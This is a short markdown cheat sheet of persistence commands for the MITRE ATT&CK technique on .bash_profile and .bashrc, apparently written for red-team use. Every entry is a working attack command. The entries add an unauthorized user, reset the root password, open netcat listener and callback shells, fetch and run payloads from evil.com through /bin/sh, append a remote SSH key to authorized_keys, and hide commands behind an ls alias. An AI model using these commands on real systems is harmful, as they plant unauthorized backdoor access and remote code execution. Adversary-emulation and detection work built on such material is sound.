# .bash_profile and .bashrc

MITRE ATT&CK Technique: [T1156](https://attack.mitre.org/wiki/Technique/T1156)

* Adding an unauthorized user (useradd)
  * `useradd test && echo test:testpass | chpasswd`
* Changing the password to an existing user (noisy, passwd)
  * `echo root:NoLogon | chpasswd` (use nologon as pass word for a tiny bit of obscurity)
* Create a backdoor listener (netcat)
  * `nc –nlp 8080`
* Create a backdoor callback (netcat)
  * `nc 192.168.0.1 8080`
* Retrieve commands from a C2 server (wget or curl)
  * `wget https://evil.com/more/commands.txt | /bin/sh`
* Download additional tools and execute (wget or curl)
  * `wget https://evil.com/bad/executeable | /bin/sh`
* Add key to authorized_keys file (paste or get from remote server)
  * `echo $(wget https://evil.com/bad/ssh/key.txt) >> ~/.ssh/authotized_keys`
* Set an alias to do additional tasks
  * `alias ls='ls –al & <any command from above>'`
